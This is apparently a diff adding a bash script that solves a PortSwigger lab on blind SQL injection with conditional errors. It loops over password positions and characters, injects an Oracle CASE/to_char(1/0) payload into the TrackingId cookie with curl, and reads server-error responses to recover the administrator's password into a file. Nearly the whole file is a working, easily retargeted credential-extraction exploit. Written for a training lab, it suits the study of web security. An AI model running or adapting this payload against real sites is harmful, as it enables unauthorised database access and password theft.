@@ -1,0 +1,34 @@
+#!/bin/bash
+## This is an exploit written for a blind sql injection lab. It tries to get
+# password of the admin using conditional error
+# Lab link:
+# https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors
+
+
+
+# Change these by obtaining the generated subdomain and trackingIP when you
+# access this lab
+trackingId="TrackingId=OxYdqDyE7HcxwQyp"
+domain="https://ac6f1f291ff66c0c800c3e9600270089.web-security-academy.net/"
+
+
+# Manually checked this by some packets
+for c in {1..20}
+do
+  # Assumed password is written only in numbers of small letters
+  for n in {48..57} {97..122};
+  do 
+    l=$(echo $n | awk '{ printf("%c", $0); }')
+    # Got database type to be Oracle
+    exploit="' and (select case when (substr(password,$c,1)='$l') then to_char(1/0) else 'a' end from users where username='administrator')='a"
+    curl -s --cookie "$trackingId$exploit" \
+      $domain | grep -q --color '[iI]nternal.*[sS]erver.*[eE]rror'
+    if [[ $? -eq "0" ]]; then
+      echo "Found char $c";
+      echo -n "$l" >> password_conditional_err.txt
+      break
+    else
+      echo "$c:$l incorrect!"
+    fi
+  done
+done
